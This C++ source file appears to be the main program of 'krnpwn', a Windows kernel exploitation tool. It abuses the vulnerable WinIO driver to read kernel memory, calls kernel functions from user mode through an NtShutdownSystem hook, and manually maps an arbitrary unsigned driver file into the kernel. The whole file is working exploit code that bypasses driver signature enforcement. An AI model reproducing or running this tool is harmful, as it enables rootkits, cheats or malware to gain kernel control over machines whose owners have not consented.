#include <memory>
#include <fstream>

#include "krnpwn/krnpwn.hpp"

#include "krnpwn/functions/mapper/mapper.hpp"

#include "util/log.hpp"
#include "util/WinSysInfoQuery.hpp"

// kernel debug print defines
#define DPFLTR_IHVDRIVER_ID 77
#define DPFLTR_ERROR_LEVEL  0


void demo( std::shared_ptr< krnpwn::krnpwn > pwn );
bool map( std::shared_ptr< krnpwn::krnpwn > pwn, char* _file );


int main( int argc, char* argv[] )
{
    auto pwn = std::make_shared< krnpwn::krnpwn >();

    auto winio = std::make_shared<krnpwn::krnpwn_winio64>();

    if( argc < 3 )
    {
        std::cout <<
            "Usage: KRNPWN.exe <driver> <function> <args>\n\n"
            "Drivers:\n"
            "\twinio\n\n"
            "Functions:\n"
            "\tmap <filename>\n"
            "\tdemo - no args\n\n";

        return -1;
    }

    if( strcmp( argv[ 1 ], "winio" ) == 0 )
    {
        if( winio->open_service() )
        {
            log_info( winio->get_service_name(), "initalised", "\n" );

            pwn->initalise( winio );
        }
        else
        {
            log_err( "failed to load", winio->get_service_name() );
            return -1;
        }
    }
    

    if( pwn->is_initalised() )
    {
        if( strcmp( argv[ 2 ], "demo" ) == 0 )
        {
            demo( pwn );
        }
        else if( strcmp( argv[ 2 ], "map" ) == 0 )
        {
            if( argc < 4 )
            {
                log_err( "no filename provided!" );
                return -1;
            }

            map( pwn, argv[ 3 ] );
        }
    }
    else
    {
        log_err( "failed to initalise krnpwn!" );
        return -1;
    }

    return 0;
}

void demo( std::shared_ptr< krnpwn::krnpwn > pwn )
{
    log_info( "reading ntoskrnl DOS header using kernel virtual address..." );

    auto ntoskrnl_base = native::find_kernel_module( "ntoskrnl.exe" );

    log_info( "ntoskrnl base:", std::hex, ntoskrnl_base );

    auto ntoskrnl_dos = pwn->read_km< IMAGE_DOS_HEADER >( ntoskrnl_base );

    log_info( "ntoskrnl magic bytes read from memory:", std::hex, ntoskrnl_dos.e_magic, "\n" );

    log_info( "calling DbgPrint" );

    auto dbg_print_proc = native::find_kernel_export( "ntoskrnl.exe", "DbgPrintEx" );

    using dbg_print_fn = uint32_t( __stdcall* )( uint32_t, uint32_t, const char* );

    auto kernel_debug = pwn->kcall< dbg_print_fn >(
        dbg_print_proc,
        DPFLTR_IHVDRIVER_ID,
        DPFLTR_ERROR_LEVEL,
        "called from usermode using NtShutdownSystem hook\n"
        );

    log_dbg( "DbgPrint ret:", std::hex, kernel_debug, "\n" );
}

bool map( std::shared_ptr< krnpwn::krnpwn > pwn, char* _file )
{
    std::vector< uint8_t > image;
    std::ifstream file( _file, std::ios::binary );

    if( !file )
    {
        log_err( "failed to open", _file );
        return false;
    }

    image.assign( std::istreambuf_iterator< char >( file ), std::istreambuf_iterator< char >() );

    file.close();

    mapper map( pwn );

    NTSTATUS ret;

    if( ( ret = map.map_image( image ) ) == 1337 )
    {
        log_info( "driver is mapped into memory" );
        log_info( "image_base :", std::hex, map.get_image_base() );
        log_info( "entry_point:", std::hex, map.get_entry_point() );
        log_info( "return value:", ret );
        return true;
    }
    else
    {
        log_err( "failed to map driver" );
        log_err( "return value:", ret );
        return false;
    }
}